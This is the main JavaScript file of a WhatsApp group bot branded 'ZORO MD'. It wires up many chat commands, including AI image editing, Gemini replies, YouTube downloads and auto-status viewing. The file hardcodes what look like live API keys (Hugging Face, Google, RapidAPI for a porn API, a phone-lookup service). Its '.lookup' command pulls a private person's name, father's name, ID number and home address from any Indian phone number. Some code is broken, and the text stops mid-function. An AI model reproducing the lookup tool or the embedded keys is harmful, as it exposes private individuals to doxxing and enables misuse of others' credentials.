
const fs = require('fs');
const path = require('path');

// Redirect temp storage away from system /tmp
const customTemp = path.join(process.cwd(), 'temp');
if (!fs.existsSync(customTemp)) fs.mkdirSync(customTemp, { recursive: true });
process.env.TMPDIR = customTemp;
process.env.TEMP = customTemp;
process.env.TMP = customTemp;

// Auto-cleaner every 3 hours
setInterval(() => {
  fs.readdir(customTemp, (err, files) => {
    if (err) return;
    for (const file of files) {
      const filePath = path.join(customTemp, file);
      fs.stat(filePath, (err, stats) => {
        if (!err && Date.now() - stats.mtimeMs > 3 * 60 * 60 * 1000) {
          fs.unlink(filePath, () => {});
        }
      });
    }
  });
  console.log('🧹 Temp folder auto-cleaned');
}, 3 * 60 * 60 * 1000);

const settings = require('./settings');
require('./config.js');
const { isBanned } = require('./lib/isBanned');
const yts = require('yt-search');
const { fetchBuffer } = require('./lib/myfunc');
const fetch = require('node-fetch');
const ytdl = require('ytdl-core');
const axios = require('axios');
const ffmpeg = require('fluent-ffmpeg');
const { isSudo } = require('./lib/index');
const isOwnerOrSudo = require('./lib/isOwner');
const crypto = require('crypto');
const {
  jidDecode,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  getContentType,
  downloadContentFromMessage,
  proto,
  generateWAMessageContent,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const { autotypingCommand, isAutotypingEnabled, handleAutotypingForMessage, handleAutotypingForCommand, showTypingAfterCommand } = require('./SAYAN/autotyping');

// Command imports
const tagAllCommand = require('./SAYAN/tagall');
const helpCommand = require('./SAYAN/help');
const banCommand = require('./SAYAN/ban');
const { promoteCommand } = require('./SAYAN/promote');
const { demoteCommand } = require('./SAYAN/demote');
const { welcomeCommand, handleJoinEvent } = require('./SAYAN/welcome');
const muteCommand = require('./SAYAN/mute');
const unmuteCommand = require('./SAYAN/unmute');
const stickerCommand = require('./SAYAN/sticker');
const isAdmin = require('./lib/isAdmin');
const warnCommand = require('./SAYAN/warn');
const warningsCommand = require('./SAYAN/warnings');
const ttsCommand = require('./SAYAN/tts');
const { tictactoeCommand, handleTicTacToeMove } = require('./SAYAN/tictactoe');
const { incrementMessageCount, topMembers } = require('./SAYAN/topmembers');
const ownerCommand = require('./SAYAN/owner');
const deleteCommand = require('./SAYAN/delete');
const { handleAntilinkCommand, handleLinkDetection } = require('./SAYAN/antilink');
const { handleAntitagCommand, handleTagDetection } = require('./SAYAN/antitag');
const { Antilink } = require('./lib/antilink');
const { handleMentionDetection, mentionToggleCommand, setMentionCommand } = require('./SAYAN/mention');
const memeCommand = require('./SAYAN/meme');
const tagCommand = require('./SAYAN/tag');
const tagNotAdminCommand = require('./SAYAN/tagnotadmin');
const hideTagCommand = require('./SAYAN/hidetag');
const jokeCommand = require('./SAYAN/joke');
const quoteCommand = require('./SAYAN/quote');
const factCommand = require('./SAYAN/fact');
const weatherCommand = require('./SAYAN/weather');
const newsCommand = require('./SAYAN/news');
const kickCommand = require('./SAYAN/kick');
const simageCommand = require('./SAYAN/simage');
const attpCommand = require('./SAYAN/attp');
const { startHangman, guessLetter } = require('./SAYAN/hangman');
const { startTrivia, answerTrivia } = require('./SAYAN/trivia');
const { complimentCommand } = require('./SAYAN/compliment');
const { insultCommand } = require('./SAYAN/insult');
const { eightBallCommand } = require('./SAYAN/eightball');
const { lyricsCommand } = require('./SAYAN/lyrics');
const { dareCommand } = require('./SAYAN/dare');
const { truthCommand } = require('./SAYAN/truth');
const { clearCommand } = require('./SAYAN/clear');
const pingCommand = require('./SAYAN/ping');
const aliveCommand = require('./SAYAN/alive');
const blurCommand = require('./SAYAN/img-blur');
const { goodbyeCommand, handleLeaveEvent } = require('./SAYAN/goodbye');
const githubCommand = require('./SAYAN/github');
const { handleAntiBadwordCommand, handleBadwordDetection } = require('./lib/antibadword');
const antibadwordCommand = require('./SAYAN/antibadword');
const { handleChatbotCommand, handleChatbotResponse } = require('./SAYAN/chatbot');
const takeCommand = require('./SAYAN/take');
const { flirtCommand } = require('./SAYAN/flirt');
const characterCommand = require('./SAYAN/character');
const wastedCommand = require('./SAYAN/wasted');
const shipCommand = require('./SAYAN/ship');
const groupInfoCommand = require('./SAYAN/groupinfo');
const resetlinkCommand = require('./SAYAN/resetlink');
const staffCommand = require('./SAYAN/staff');
const unbanCommand = require('./SAYAN/unban');
const emojimixCommand = require('./SAYAN/emojimix');
const { handlePromotionEvent } = require('./SAYAN/promote');
const { handleDemotionEvent } = require('./SAYAN/demote');
const viewOnceCommand = require('./SAYAN/viewonce');
const clearSessionCommand = require('./SAYAN/clearsession');
const { simpCommand } = require('./SAYAN/simp');
const { stupidCommand } = require('./SAYAN/stupid');
const stickerTelegramCommand = require('./SAYAN/stickertelegram');
const textmakerCommand = require('./SAYAN/textmaker');
const { handleAntideleteCommand, handleMessageRevocation, storeMessage } = require('./SAYAN/antidelete');
const clearTmpCommand = require('./SAYAN/cleartmp');
const setProfilePicture = require('./SAYAN/setpp');
const { setGroupDescription, setGroupName, setGroupPhoto } = require('./SAYAN/groupmanage');
const instagramCommand = require('./SAYAN/instagram');
const facebookCommand = require('./SAYAN/facebook');
const spotifyCommand = require('./SAYAN/spotify');
const playCommand = require('./SAYAN/play');
const tiktokCommand = require('./SAYAN/tiktok');
const aiCommand = require('./SAYAN/ai');
const urlCommand = require('./SAYAN/url');
const { handleTranslateCommand } = require('./SAYAN/translate');
const { handleSsCommand } = require('./SAYAN/ss');
const { goodnightCommand } = require('./SAYAN/goodnight');
const { shayariCommand } = require('./SAYAN/shayari');
const { rosedayCommand } = require('./SAYAN/roseday');
const imagineCommand = require('./SAYAN/imagine');
const videoCommand = require('./SAYAN/video');
const sudoCommand = require('./SAYAN/sudo');
const { miscCommand, handleHeart } = require('./SAYAN/misc');
const { animeCommand } = require('./SAYAN/anime');
const { piesCommand, piesAlias } = require('./SAYAN/pies');
const stickercropCommand = require('./SAYAN/stickercrop');
const removebgCommand = require('./SAYAN/removebg');
const { reminiCommand } = require('./SAYAN/remini');
const { igsCommand } = require('./SAYAN/igs');
const { anticallCommand, readState: readAnticallState } = require('./SAYAN/anticall');
const { pmblockerCommand, readState: readPmBlockerState } = require('./SAYAN/pmblocker');
const settingsCommand = require('./SAYAN/settings');
const soraCommand = require('./SAYAN/sora');

const LOOKUP_API_KEY = "vishalboss_key_6adcadb1cd9e1ba26ffcedc4bb3ee9f49feb042c";
const LOOKUP_API_URL = "https://numberimfo.vishalboss.sbs/api.php";
const LOOKUP_CREATOR = "*_ZORO_*";
// Global settings
global.packname = settings.packname;
global.author = settings.author;
global.channelLink = "https://whatsapp.com/channel/0029VbBYK1T0gcfRPEoYUT1p";
global.ytch = "ZORO MD";

// Add this near the top of main.js with other global configurations
const channelInfo = {
    contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363422621988237@newsletter',
            newsletterName: 'ZORO MD',
            serverMessageId: -1
        }
    }
};





















































// S7











// ===== paise dekar karva raha hai nahin to nahin karta 😂
const PORN_API_KEY = "e3b8bf3774msh41048d550fcf529p1e8ad9jsn16483b93062f";
const PORN_API_HOST = "porn-pictures-api.p.rapidapi.com";
const PORN_API_BASE = "https://porn-pictures-api.p.rapidapi.com";


async function fetchRandomFemalePornstar() {
    const page = Math.floor(Math.random() * 50) + 1;

    const url = `${PORN_API_BASE}/pornstars/female/${page}`;

    const res = await axios.get(url, {
        headers: {
            "x-rapidapi-key": PORN_API_KEY,
            "x-rapidapi-host": PORN_API_HOST
        },
        timeout: 15000
    });

    const list = res.data?.result || [];
    if (!list.length) return null;

    return list[Math.floor(Math.random() * list.length)];
}



const apiKeys = [
    "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"
];

async function aieditCommand(sock, chatId, message, rawText) {
    try {
        const prompt = rawText.slice(8).trim();
        
        if (!prompt) {
            return await sock.sendMessage(chatId, { 
                text: "❌ Please provide instructions.\nExample: *.aiedit make it a sunset background*" 
            }, { quoted: message });
        }

        const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const isImage = quoted?.imageMessage || (quoted?.documentMessage?.mimetype?.includes('image'));

        if (!isImage) {
            return await sock.sendMessage(chatId, { 
                text: "❌ Please reply to an *image* with the command .aiedit" 
            }, { quoted: message });
        }

        await sock.sendMessage(chatId, { text: "⏳ *ZORO BOT* is processing your image... (Applying AI Fix)" }, { quoted: message });

        // 1. Download WhatsApp Image
        const imageMsg = quoted.imageMessage || quoted.documentMessage;
        const stream = await downloadContentFromMessage(imageMsg, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        const base64Image = buffer.toString('base64');

        let success = false;
        let lastError = "";

        // Hum do alag-alag models try karenge agar ek fail ho jaye
        const models = [
            "timbrooks/instruct-pix2pix", 
            "runwayml/stable-diffusion-v1-5"
        ];

        for (let key of apiKeys) {
            for (let modelPath of models) {
                try {
                
                    const response = await axios({
                        method: 'post',
                        url: `https://api-inference.huggingface.co/models/${modelPath}`,
                        headers: {
                            'Authorization': `Bearer ${key}`,
                            'Content-Type': 'application/json',
                            'x-use-cache': 'false'
                        },
                        data: {
                            inputs: prompt,
                            image: base64Image,
                        },
                        responseType: 'arraybuffer',
                        timeout: 60000 // 60 seconds wait
                    });

                    // 3. Send Edited Image
                    await sock.sendMessage(chatId, {
                        image: Buffer.from(response.data),
                        caption: `✨ *AI Edit Success*\n\n*Model:* ${modelPath}\n*Prompt:* ${prompt}\n\n*powered by ZORO BOT*`
                    }, { quoted: message });

                    success = true;
                    break;

                } catch (err) {
                    if (err.response && err.response.status === 302) {
                        lastError = "Router redirection issue. Try again later.";
                    } else {
                        try {
                            const errString = Buffer.from(err.response.data).toString();
                            lastError = JSON.parse(errString).error || err.message;
                        } catch (e) {
                            lastError = err.message;
                        }
                    }
                    console.log(`Model ${modelPath} failed: ${lastError}`);
                    continue; 
                }
            }
            if (success) break; 
        }

        if (!success) {
            await sock.sendMessage(chatId, { 
                text: `❌ *Edit Failed*\n\nError: ${lastError}\n\n*Tip:* Agar 'Loading' error hai toh 1 minute baad fir try karein.` 
            }, { quoted: message });
        }

    } catch (error) {
        console.error("Zoro Bot Critical Error:", error);
    }
}














// ================= AI CONFIGURATION =================
const SY_LOVE_KEY = "AIzaSyDUzcX56Af9QpoWF9VgeGTzZqBpFrdxY6o";

async function LOVEAIxSYREPLAY(text) {
    const model = "gemini-2.5-flash-lite"; 
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${SY_LOVE_KEY}`;

    let retries = 3;
    let delay = 2000; 

    for (let i = 0; i < retries; i++) {
        try {
            const res = await axios.post(
                url,
                { contents: [{ parts: [{ text }] }] },
                { headers: { "Content-Type": "application/json" } }
            );

            const aiResponse = res.data?.candidates?.[0]?.content?.parts?.[0]?.text;
            return aiResponse ? aiResponse.trim() : "⚠️ Gemini returned no content.";

        } catch (err) {
            const status = err.response?.status;


            if (status === 429 && i < retries - 1) {
                console.log(`Rate limit hit. Retrying in ${delay / 1000}s... (Attempt ${i + 1})`);
                await new Promise(resolve => setTimeout(resolve, delay));
                delay *= 2;
                continue;
            }

            console.error("Gemini API Error:", err.response?.data?.error?.message || err.message);
            
            if (status === 429) return "⚠️ Server Busy: Google limit reached. Try again in 1 minute.";
            if (status === 404) return "❌ Error: The model name is incorrect or not available in your region.";
            
            return "❌ Gemini Error: Something went wrong, please try again.";
        }
    }
}





const LOVEDBSY = require('./data/data.json');

function isLOVSmeSY(message, sock) {
    try {
        const data = JSON.parse(fs.readFileSync('./data/data.json', 'utf-8'));
        
        let cleanNumber;


        if (message.key.fromMe && sock && sock.user) {
             const botId = sock.user.id || "";
             cleanNumber = botId.split(':')[0].split('@')[0];
        } else {
             const senderJid = message.key.participant || message.key.remoteJid;
             const decoded = jidDecode(senderJid);
             cleanNumber = (decoded.user || decoded.id || senderJid).split('@')[0].split(':')[0];
        }

        return data.premium.includes(cleanNumber);
    } catch (e) {
        console.log("Error reading premium data:", e);
        return false;
    }
}










































function cleanIndianNumber(input) {
    let num = input.replace(/\D/g, '');
    if (num.startsWith('91') && num.length === 12) {
        num = num.slice(2);
    }
    if (num.length > 10) {
        num = num.slice(-10);
    }

    return num.length === 10 ? num : null;
}


async function lookupCommand(sock, chatId, message, rawText) {
    try {
        let number = null;

        // 1️⃣ Check mentioned number
        const mentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (mentioned && mentioned.length > 0) {
            number = mentioned[0].split('@')[0];
        }

        // 2️⃣ Else check text number
        if (!number) {
            const parts = rawText.trim().split(/\s+/);
            if (!parts[1]) {
                await sock.sendMessage(chatId, {
                    text: '❌ Usage:\n.lookup 9XXXXXXXXX\n.lookup @number'
                }, { quoted: message });
                return;
            }
            number = parts[1];
        }

        // 3️⃣ Clean & validate
        const cleanNumber = cleanIndianNumber(number);
        if (!cleanNumber) {
            await sock.sendMessage(chatId, {
                text: '❌ Please send a valid Indian 10-digit number 🇮🇳'
            }, { quoted: message });
            return;
        }

        await sock.sendMessage(chatId, {
            text: '⏳ Fetching data, please wait...'
        }, { quoted: message });

        const apiUrl = `${LOOKUP_API_URL}?number=${cleanNumber}&key=${LOOKUP_API_KEY}`;
        const res = await axios.get(apiUrl);

        const data = Array.isArray(res.data?.result) ? res.data.result : [];

        if (!data.length) {
            await sock.sendMessage(chatId, {
                text: '⚠️ No data found for this number.'
            }, { quoted: message });
            return;
        }

        let reply = `🔍 *LOOKUP RESULT*\n📱 *Number:* ${cleanNumber}\n━━━━━━━━━━━━━━━\n\n`;

        data.forEach((e, i) => {
            reply +=
`🔰 *ENTRY ${i + 1}*
👤 Name: ${e.name || 'N/A'}
🧓 Father: ${e.father_name || 'N/A'}
📞 Mobile: ${e.mobile || 'N/A'}
📱 Alt: ${e.alt_mobile || 'N/A'}
🆔 ID: ${e.id_number || 'N/A'}
🌐 Circle: ${e.circle || 'N/A'}
🏠 Address: ${(e.address || 'N/A')
    .replace(/!/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()}
━━━━━━━━━━━━━━━\n\n`;
        });

        reply += `✨ Bot *${LOOKUP_CREATOR}*`;

        await sock.sendMessage(chatId, {
            text: reply
        }, { quoted: message });

    } catch (err) {
        console.error('LOOKUP ERROR:', err);
        await sock.sendMessage(chatId, {
            text: '⚠️ Error fetching data from API.'
        }, { quoted: message });
    }
}








async function autoStatusCommand(sock, chatId, msg, args, phoneNumber) {
    try {
        const senderId = msg.key.participant || msg.key.remoteJid;
const sender = message.key.participant || message.key.remoteJid;
const senderNumber = sock.decodeJid(sender).split('@')[0]; 

        const isOwner = await isOwnerOrSudo(senderId, sock, chatId);
        
        if (!msg.key.fromMe && !isOwner) {
            await sock.sendMessage(chatId, { 
                text: '❌ This command can only be used by the owner!',
                ...channelInfo
            });
            return;
        }

        // SESSION CONFIG
        let config = readAutoStatus(phoneNumber);

        if (!args || args.length === 0) {
            const status = config.enabled ? 'enabled' : 'disabled';
            const reactStatus = config.react ? 'enabled' : 'disabled';

            await sock.sendMessage(chatId, { 
                text:
`🔄 *Auto Status Settings*

📱 *Auto Status View:* ${status}
💫 *Status Reactions:* ${reactStatus}

*Commands:*
.autostatus on
.autostatus off
.autostatus react on
.autostatus react off`,
                ...channelInfo
            });
            return;
        }

        const command = args[0].toLowerCase();

        if (command === 'on') {
            config.enabled = true;
            writeAutoStatus(phoneNumber, config);

            await sock.sendMessage(chatId, { 
                text: '✅ Auto status view has been enabled!',
                ...channelInfo
            });

        } else if (command === 'off') {
            config.enabled = false;
            writeAutoStatus(phoneNumber, config);

            await sock.sendMessage(chatId, { 
                text: '❌ Auto status view has been disabled!',
                ...channelInfo
            });

        } else if (command === 'react') {

            if (!args[1]) {
                await sock.sendMessage(chatId, { 
                    text: '❌ Use: .autostatus react on/off',
                    ...channelInfo
                });
                return;
            }

            const reactCommand = args[1].toLowerCase();

            if (reactCommand === 'on') {
                config.react = true;
                writeAutoStatus(phoneNumber, config);

                await sock.sendMessage(chatId, { 
                    text: '💫 Status reactions enabled',
                    ...channelInfo
                });

            } else if (reactCommand === 'off') {
                config.react = false;
                writeAutoStatus(phoneNumber, config);

                await sock.sendMessage(chatId, { 
                    text: '❌ Status reactions disabled',
                    ...channelInfo
                });

            } else {
                await sock.sendMessage(chatId, { 
                    text: '❌ Invalid option',
                    ...channelInfo
                });
            }

        } else {
            await sock.sendMessage(chatId, { 
                text: '❌ Invalid command',
                ...channelInfo
            });
        }

    } catch (error) {
        console.error('Error in autostatus command:', error);
    }
}

function isAutoStatusEnabled(phoneNumber) {
    try {
        return readAutoStatus(phoneNumber).enabled;
    } catch {
        return false;
    }
}

async function reactToStatus(sock, statusKey, phoneNumber) {
    try {
        if (!isStatusReactionEnabled(phoneNumber)) return;

        await sock.relayMessage(
            'status@broadcast',
            {
                reactionMessage: {
                    key: {
                        remoteJid: 'status@broadcast',
                        id: statusKey.id,
                        participant: statusKey.participant || statusKey.remoteJid,
                        fromMe: false
                    },
                    text: '💚'
                }
            },
            {
                messageId: statusKey.id,
                statusJidList: [
                    statusKey.remoteJid,
                    statusKey.participant || statusKey.remoteJid
                ]
            }
        );

    } catch (e) {
        console.error('❌ Status react error:', e.message);
    }
}



async function handleStatusUpdate(sock, status, phoneNumber) {
    try {
        if (!isAutoStatusEnabled(phoneNumber)) return;

        await new Promise(r => setTimeout(r, 1000));

        const msg = status.messages?.[0];
        if (!msg || msg.key.remoteJid !== 'status@broadcast') return;

        await sock.readMessages([msg.key]);
        await reactToStatus(sock, msg.key, phoneNumber);

    } catch (e) {
        console.error('❌ AutoStatus error:', e.message);
    }
}







// download YT with SY loves 



async function handleYtButton(sock, message) {
    try {
        let selectedId = '';
        if (message.message?.buttonsResponseMessage) {
            selectedId = message.message.buttonsResponseMessage.selectedButtonId;
        } else if (message.message?.interactiveResponseMessage) {
            const paramsJson = JSON.parse(message.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
            selectedId = paramsJson.id;
        }

        if (!selectedId || !selectedId.startsWith('ytq|')) return;

        const [, quality, url] = selectedId.split('|');
        const chatId = message.key.remoteJid;

        const title = "YouTube Video"; 

        await sock.sendMessage(chatId, { 
            text: `⏳ *Downloading:* ${title}...`,
            contextInfo: {
                externalAdReply: {
                    title: "𝒁𝑶𝑹𝑶 𝒀𝑻 𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫𝑬𝑹",
                    body: "ZORO x S7 Engine Processing...",
                    mediaType: 1,
                    thumbnailUrl: "https://i.top4top.io/p_3664firq70.jpg",
                    sourceUrl: "https://whatsapp.com/channel/0029VbBNGI36buMJeLm3Su3P",
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: message });

        const YT_SY_LOVES_API = "https://yt-downloader-api-s7.onrender.com";
        const MY_HEART_SY_KEY = "S7LOVESY";

        const apiUrl = `${YT_SY_LOVES_API}/video?url=${encodeURIComponent(url)}&quality=${quality}&key=${MY_HEART_SY_KEY}`;

        const simpleCaption = `✅ *Download Successful*\n\n>  𝒁𝑶𝑹𝑶 𝒙 𝑺7`;

        await sock.sendMessage(chatId, {
            video: { url: apiUrl },
            caption: simpleCaption
        }, { quoted: message });

    } catch (err) {
        console.error("YT Button Error:", err);
        await sock.sendMessage(message.key.remoteJid, { text: "❌ Error downloading video." }, { quoted: message });
    }
}







/*async function handleYtAudio(sock, chatId, message, query) {
    try {
        const search = await yts(query);
        const video = search.videos[0]; 

        if (!video) {
            return await sock.sendMessage(chatId, { text: "❌ Sorry, I did not find that song!" });
        }

        const title = video.title;
        const url = video.url;
        const duration = video.timestamp;
        const author = video.author.name;

        await sock.sendMessage(chatId, { 
            text: `🎵 *Found:* ${title}\n⏱️ *Duration:* ${duration}\n📺 *Channel:* ${author}\n\n> 𝒁𝑶𝑹𝑶 𝑺7 Engine is downloading your audio...`,
            contextInfo: {
                externalAdReply: {
                    title: "𝒁𝑶𝑹𝑶 𝑨𝑼𝑫𝑰𝑶 𝑷𝑳𝑨𝒀𝑬𝑹",
                    body: "Join our Channel for Updates!",
                    mediaType: 1,
                    thumbnailUrl: video.thumbnail,
                    sourceUrl: "https://sabir7718.is-a.dev",
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: message });

        const YT_SY_LOVES_API = "https://yt-downloader-api-s7.onrender.com";
        const MY_HEART_SY_KEY = "S7LOVESY";
        const apiUrl = `${YT_SY_LOVES_API}/audio?url=${encodeURIComponent(url)}&key=${MY_HEART_SY_KEY}`;

        await sock.sendMessage(chatId, {
            audio: { url: apiUrl },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`,
            contextInfo: {
                externalAdReply: {
                    title: title,
                    body: "✅ Successful, 𝒁𝑶𝑹𝑶 𝒙 𝑺7",
                    thumbnailUrl: video.thumbnail,
                    sourceUrl: "https://sabir7718.is-a.dev", 
                    mediaType: 1
                }
            }
        }, { quoted: message });

    } catch (err) {
        console.error("Play Command Error:", err);
        await sock.sendMessage(chatId, { text: "❌ Error: The API is not responding or the search failed." });
    }
}*/

async function handleYtAudio(sock, chatId, message, query) {
    try {
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return await sock.sendMessage(chatId, { text: "❌ Sorry, I did not find that song!" });
        }

        const title = video.title;
        const url = video.url;
        const duration = video.timestamp;
        const author = video.author.name;

        await sock.sendMessage(chatId, { 
            text: `🎵 *Found:* ${title}\n⏱️ *Duration:* ${duration}\n📺 *Channel:* ${author}\n\n> 𝒁𝑶𝑹𝑶 𝑺7 Engine is downloading your audio...`,
            contextInfo: {
                externalAdReply: {
                    title: "𝒁𝑶𝑹𝑶 𝑨𝑼𝑫𝑰𝑶 𝑷𝑳𝑨𝒀𝑬𝑹",
                    body: "Join our Channel for Updates!",
                    mediaType: 1,
                    thumbnailUrl: video.thumbnail,
                    sourceUrl: "https://sabir7718.is-a.dev",
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: message });

        const apiUrl = `https://api.yupra.my.id/api/downloader/ytmp3?url=${encodeURIComponent(url)}`;
        const apiRes = await axios.get(apiUrl);

        if (!apiRes.data || !apiRes.data.success || !apiRes.data.data.download_url) {
            throw new Error("Invalid API response");
        }

        const audioUrl = apiRes.data.data.download_url;

        await sock.sendMessage(chatId, {
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`,
            contextInfo: {
                externalAdReply: {
                    title: title,
                    body: "✅ Successful, 𝒁𝑶𝑹𝑶 𝒙 𝑺7",
                    thumbnailUrl: video.thumbnail,
                    sourceUrl: "https://sabir7718.is-a.dev",
                    mediaType: 1
                }
            }
        }, { quoted: message });

    } catch (err) {
        console.error("Play Command Error:", err);
        await sock.sendMessage(chatId, { text: "❌ Error: The API is not responding or the search failed." }, { quoted: message });
    }
}







async function ytmp4Preview(sock, chatId, message, url) {

    try {
        await sock.sendMessage(chatId, { react: { text: "🔎", key: message.key } });

        const videoIdRegex = /(?:v=|\/embed\/|\/1.1\/|shorts\/|youtu.be\/|v\/|e\/|u\/\w+\/|embed\/|v=)([^#\&\?]*).*/;
        const match = url.match(videoIdRegex);
        const videoId = (match && match[1].length === 11) ? match[1] : null;
        if (!videoId) throw new Error("Invalid YouTube Link");

        const info = await yts({ videoId: videoId });
        const { title, author, timestamp, views, thumbnail, url: videoUrl } = info;

        const imageMsg = await generateWAMessageContent({ image: { url: thumbnail } }, { upload: sock.waUploadToServer });

        const msg = await generateWAMessageFromContent(chatId, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `🎞️ *ZORO VIDEO MANAGER*\n\n📌 *Title:* ${title}\n👤 *Author:* ${author.name}\n⏱️ *Duration:* ${timestamp}\n👁️ *Views:* ${views.toLocaleString()}\n\n👇 *Select Quality Below*`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: `> 𝒁𝑶𝑹𝑶 𝒙 𝑺7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            hasMediaAttachment: true,
                            imageMessage: imageMsg.imageMessage
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({ display_text: "🎥 360p Quality", id: `ytq|360|${videoUrl}` })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({ display_text: "🎬 720p Quality", id: `ytq|720|${videoUrl}` })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({ display_text: "🚀 MAX Quality", id: `ytq|max|${videoUrl}` })
                                }
                            ]
                        })
                    })
                }
            }
        }, { quoted: message });

        await sock.relayMessage(chatId, msg.message, { messageId: msg.key.id });

    } catch (e) {
        console.error("YT Preview Error:", e);
        await sock.sendMessage(chatId, { text: `❌ *Error:* ${e.message}` }, { quoted: message });
    }
}


























const AUTO_REACT_EMOJIS = [
  '❤️','🔥','😂','😍','👍','😎','✨','💯','🤍','😆','🥰'
];

function getRandomReactEmoji() {
  return AUTO_REACT_EMOJIS[Math.floor(Math.random() * AUTO_REACT_EMOJIS.length)];
}

async function sendAutoReaction(sock, message) {
  try {
    if (!message?.key?.id) return;

    await sock.sendMessage(message.key.remoteJid, {
      react: {
        text: getRandomReactEmoji(),
        key: message.key
      }
    });
  } catch (e) {
    console.log('❌ AutoReact failed:', e.message);
  }
}












function getSessionDataPath(phoneNumber, file) {
    return path.join(__dirname, 'sessions', phoneNumber, 'data', file);
}

function readSessionJSON(phoneNumber, file, defaultData) {
    const dirPath = path.join(__dirname, 'sessions', phoneNumber, 'data');
    const filePath = path.join(dirPath, file);

    try {
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }

        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            return defaultData;
        }

        return JSON.parse(fs.readFileSync(filePath));
    } catch (e) {
        console.error('readSessionJSON error:', e);
        return defaultData;
    }
}






function writeSessionJSON(phoneNumber, file, data) {
    const filePath = getSessionDataPath(phoneNumber, file);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}



// stats SYS7

function getAutoStatusState(phoneNumber) {
    return readAutoStatus(phoneNumber);
}

function setAutoStatusState(phoneNumber, data) {
    writeAutoStatus(phoneNumber, data);
}


function getSessionAutoStatusPath(phoneNumber) {
    const dir = path.join(__dirname, 'sessions', phoneNumber, 'data');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    return path.join(dir, 'autostatus.json');
}

function readAutoStatus(phoneNumber) {
    const file = getSessionAutoStatusPath(phoneNumber);
    const defaultStatus = { enabled: false, reactOn: false };
    
    try {
        if (!fs.existsSync(file)) {
            fs.writeFileSync(file, JSON.stringify(defaultStatus, null, 2));
            return defaultStatus;
        }
        const content = fs.readFileSync(file, 'utf-8').trim();
        if (!content) return defaultStatus;

        return JSON.parse(content);
    } catch (e) {
        return defaultStatus;
    }
}


function writeAutoStatus(phoneNumber, data) {
    fs.writeFileSync(
        getSessionAutoStatusPath(phoneNumber),
        JSON.stringify(data, null, 2)
    );
}


function getAnticallState(phoneNumber) {
    return readSessionJSON(phoneNumber, 'anticall.json', {
        enabled: false,
        block: true,      // auto block caller
        message: '❌ Calls are not allowed'
    });
}

function setAnticallState(phoneNumber, data) {
    writeSessionJSON(phoneNumber, 'anticall.json', data);
}

function getAutoReactState(phoneNumber) {
    return readSessionJSON(phoneNumber, 'autoreact.json', {
        enabled: false
    });
}

function setAutoReactState(phoneNumber, enabled) {
    writeSessionJSON(phoneNumber, 'autoreact.json', {
        enabled
    });
}

function getAutoreadState(phoneNumber) {
    return readSessionJSON(phoneNumber, 'autoread.json', {
        enabled: false
    });
}

function setAutoreadState(phoneNumber, enabled) {
    writeSessionJSON(phoneNumber, 'autoread.json', {
        enabled
    });
}


function isBotMentionedInMessage(message, botNumber) {
    if (!message.message) return false;
    
    const messageTypes = [
        'extendedTextMessage', 'imageMessage', 'videoMessage', 'stickerMessage',
        'documentMessage', 'audioMessage', 'contactMessage', 'locationMessage'
    ];
    
    for (const type of messageTypes) {
        if (message.message[type]?.contextInfo?.mentionedJid) {
            const mentionedJid = message.message[type].contextInfo.mentionedJid;
            if (mentionedJid.some(jid => jid === botNumber)) {
                return true;
            }
        }
    }
    
    const textContent = 
        message.message.conversation || 
        message.message.extendedTextMessage?.text ||
        message.message.imageMessage?.caption ||
        message.message.videoMessage?.caption || '';
    
    if (textContent) {
        const botUsername = botNumber.split('@')[0];
        if (textContent.includes(`@${botUsername}`)) {
            return true;
        }
        
        const botNames = [global.botname?.toLowerCase(), 'bot', 's7', 'zoro bot'];
        const words = textContent.toLowerCase().split(/\s+/);
        if (botNames.some(name => words.includes(name))) {
            return true;
        }
    }
    
    return false;
}



// ================= HANDLE S7


async function handleAutoStatus(sock, message, phoneNumber) {
    try {
        if (message.key.remoteJid !== 'status@broadcast') return;

        const state = getAutoStatusState(phoneNumber);
        if (!state.enabled) return;

        await sock.readMessages([message.key]);

        if (state.react) {
            await sock.sendMessage('status@broadcast', {
                react: {
                    text: state.emoji || '❤️',
                    key: message.key
                }
            });
        }
    } catch (e) {
        console.error('❌ AutoStatus error:', e.message);
    }
}


async function handleAutoread(sock, message, phoneNumber) {
    const state = getAutoreadState(phoneNumber);
    if (!state.enabled) return;

    const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    const mentioned = isBotMentionedInMessage(message, botJid);

    if (mentioned) return;

    await sock.readMessages([{
        remoteJid: message.key.remoteJid,
        id: message.key.id,
        participant: message.key.participant
    }]);
}











async function kickAllS7SY(sock, chatId) {
    try {
        if (!chatId.endsWith('@g.us')) {
